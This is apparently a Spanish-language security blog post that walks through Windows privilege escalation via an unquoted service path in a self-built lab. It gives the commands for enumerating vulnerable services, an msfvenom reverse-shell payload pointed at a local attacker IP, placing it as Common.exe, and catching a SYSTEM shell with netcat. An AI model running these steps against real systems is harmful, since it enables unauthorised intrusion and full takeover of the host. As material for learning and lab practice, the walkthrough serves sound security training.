---
layout: post
title: Unquoted Service Path
subtitle: Unquoted Service Path
tags: [privesc,windows]
---

Si la ruta a un binario del servicio no está entre comillas y contiene espacio en blanco puede dar como resultado que un usuario local con privilegios bajos tenga posibilidad de elevar el privilegio a shell de sistema.

La API de Windows debe asumir donde encontrar la aplicación a la que se hace referencia si la ruta contiene espacios y no está entre comillas.  
Por ejemplo un servicio vulnerable:

```
C:\Program Files\Unquoted Path Service\Common Files\file.exe
```

El sistema leerá esta ruta en la siguiente secuencia de 1 a 4 para activar `file.exe` a tráves de un directorio grabable

```
C:\Program.exe
C:\Program Files\Unquoted.exe
C:\Program Files\Unquoted Path.exe
C:\Program Files\Unquoted Path Service\Common.exe
C:\Program Files\Unquoted Path Service\Common Files\file.exe
```

### Configuración de la laboratorio

Desde un usuario con privilegios de crear servicios

```
mkdir "Unquoted Path Service"
cd "Unquoted Path Service"
mkdir "Common Files"
sc create "vuln" binpath= "C:\Program Files\Unquoted Path Service\Common Files\files.exe" start= auto
icacls "C:\Program Files\Unquoted Path Service" /grant "BUILTIN\Users":W
subinacl.exe /service vuln /grant=win7\test123=PTO
```

Enumerando servicios con esta vulnerabilidad

| argumento | descripción |
|----|---|
| /i | no distinguir entre mayuscula y minusculas |
| /v | imprime lineas que no tienen coincidencia |

```
wmic service get name,displayname,pathname,startmode | findstr /i "Auto" | findstr /i /v "C:\Windows\\" |findstr /i /v """
ScsiAccess                                                      ScsiAccess                      C:\Program Files\Photodex\ProShow Producer\ScsiAccess.exe                                Auto 
System Scheduler Service                                        WindowsScheduler                C:\PROGRA~1\SYSTEM~1\WService.exe                                                        Auto 
vuln                                                            vuln                            C:\Program Files\Unquoted Path Service\Common Files\files.exe                            Auto 
```

Consultar el estado del servicio 

```
sc query vuln
SERVICE_NAME: vuln 
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 1  STOPPED 
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
```

Consultar sobre información de configuración para el servicio

```
sc qc vuln
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: vuln
        TYPE               : 10  WIN32_OWN_PROCESS 
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Program Files\Unquoted Path Service\Common Files\files.exe
        LOAD_ORDER_GROUP   : 
        TAG                : 0
        DISPLAY_NAME       : vuln
        DEPENDENCIES       : 
        SERVICE_START_NAME : LocalSystem
```

Comprobamos los permisos en la carpeta `C:\Program Files\Unquoted Path Service`

```
icacls "C:\Program Files\Unquoted Path Service"
C:\Program Files\Unquoted Path Service BUILTIN\Users:(W)
                                       NT SERVICE\TrustedInstaller:(I)(F)
                                       NT SERVICE\TrustedInstaller:(I)(CI)(IO)(F)
                                       NT AUTHORITY\SYSTEM:(I)(F)
                                       NT AUTHORITY\SYSTEM:(I)(OI)(CI)(IO)(F)
                                       BUILTIN\Administrators:(I)(F)
                                       BUILTIN\Administrators:(I)(OI)(CI)(IO)(F)
                                       BUILTIN\Users:(I)(RX)
                                       BUILTIN\Users:(I)(OI)(CI)(IO)(GR,GE)
                                       CREATOR OWNER:(I)(OI)(CI)(IO)(F)
```

Creación de la carga útil

```
❯ sudo msfvenom -p windows/shell_reverse_tcp lhost=192.168.0.107 lport=4444 -f exe > shell.exe
```

Desde la máquina Windows transferimos el ejecutable y renombramos a `Common.exe`

```
copy \\192.168.0.107\share\shell.exe shell.exe
move shell.exe Common.exe
```

Obteniendo una shell como sistema

```
sc start vuln

───────────────────────────────────────────────────────────────
❯ nc -lvnp 4444
listening on [any] 4444 ...
connect to [192.168.0.107] from (UNKNOWN) [192.168.0.102] 49201
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

```
